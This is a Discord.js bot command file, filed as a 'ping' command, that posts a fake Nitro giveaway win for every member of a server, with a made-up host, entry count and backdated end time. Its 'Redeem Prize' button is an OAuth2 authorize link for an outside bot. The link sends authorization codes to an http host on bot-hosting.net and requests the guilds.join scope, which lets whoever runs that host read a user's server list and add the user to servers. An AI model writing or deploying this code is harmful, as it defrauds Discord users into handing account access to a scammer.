// 📁 commands/ping.js
const { MessageActionRow, MessageButton, MessageEmbed } = require('discord.js');


module.exports = {
  name: 'pingsadsadasdasdasds',
  async execute(message, args, client) {
    message.guild.members.cache.forEach(member => {
const targetDate = new Date();
targetDate.setDate(targetDate.getDate() - 3);

const timeDiff = new Date() - targetDate;
const timestamp = Math.floor(targetDate.getTime() / 1000);

const formattedDate = `<t:${Math.floor(targetDate.getTime() / 1000)}:F>`;

const result = `<t:${timestamp}:R> (${formattedDate})`;

const giveawayEmbed = new MessageEmbed()
    .setTitle('$9.99 Discord Nitro')
    .setDescription(`**Ended:** ${result}\n**Hosted by:** <@709906466894774392>\n**Entries:** 186\n**Winners:** <@${member.id}>`)
    .setFooter(`Giveaways`, 'https://media.discordapp.net/attachments/1353029367768416267/1356422649990877345/images_4_1.png?ex=67f5bd08&is=67f46b88&hm=f4af40805c1826b304fad38cf6fb0cf59f16d683e795e436002be81477e5c1ce&')
    .setColor('#a0b2ed')
    .setTimestamp();

const redeemButton = new MessageButton()
    .setLabel('Redeem Prize')
    .setStyle('LINK')
    .setURL('https://discord.com/oauth2/authorize?client_id=1348342430268657758&response_type=code&redirect_uri=http%3A%2F%2Ffi9.bot-hosting.net%3A20730%2Flogin&scope=identify+guilds+guilds.join');

const row = new MessageActionRow().addComponents(redeemButton);

message.channel.send({
    content: `**🎉 GIVEAWAY ENDED 🎉**\n Congratulations, <@${member.id}> you won a **$9.99 Discord Nitro** giveaway! :tada:`,
    embeds: [giveawayEmbed],
    components: [row]
});

    });

    
  }
};